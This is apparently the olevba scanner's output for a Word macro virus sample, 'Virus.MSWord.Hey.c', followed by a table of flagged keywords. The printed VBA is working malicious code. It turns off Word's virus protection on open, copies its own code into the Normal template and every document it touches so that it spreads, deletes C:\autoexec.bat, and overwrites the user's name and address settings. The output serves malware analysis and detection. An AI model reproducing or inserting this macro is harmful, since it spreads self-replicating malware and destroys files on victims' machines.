olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Hey.c-a55fbaf8118ea0c7ed67acaedf121f63a51958d9
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Hey.c-a55fbaf8118ea0c7ed67acaedf121f63a51958d9 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen(): Options.VirusProtection = 0
Application.Caption = "MIcroSOFT - DROW | lamp!!!?"
End Sub
Sub AutoNew()
©éŁă
End Sub
Sub ©éŁă()
Set ¤ = NormalTemplate.VBProject.VBComponents(1): Set ˇ = ActiveDocument.VBProject.VBComponents(1): Set Ł = ThisDocument.VBProject.VBComponents(1):
If ¤.CodeModule.CountOfLines < 1 Then ¤.CodeModule.InsertLines 1, Ł.CodeModule.Lines(1, 40)
If ˇ.CodeModule.CountOfLines < 1 Then ˇ.CodeModule.InsertLines 1, Ł.CodeModule.Lines(1, 40)
End Sub
Sub DateiBeenden()
End Sub
Sub ExtrasMakro()
End Sub
Sub FormatZeichen()
©éŁă
End Sub
Sub HilfeInfo()
Kill "C:\autoexec.bat"
End Sub
Sub ExtrasOptionen()
Application.UserName = "Zeus"
Application.UserAddress = "HAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHA"
Application.UserInitials = "Dead"
Dialogs(wdDialogToolsOptions).Show
End Sub
Sub DateiSpeichernUnter()
Dialogs(wdDialogFileSaveAs).Show (1000)
End Sub
Sub BearbeitenEinfügen()
©éŁă
End Sub
Sub BearbeitenSuchen()
©éŁă
End Sub
Sub AutoClose()
©éŁă
MsgBox "", , ""
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

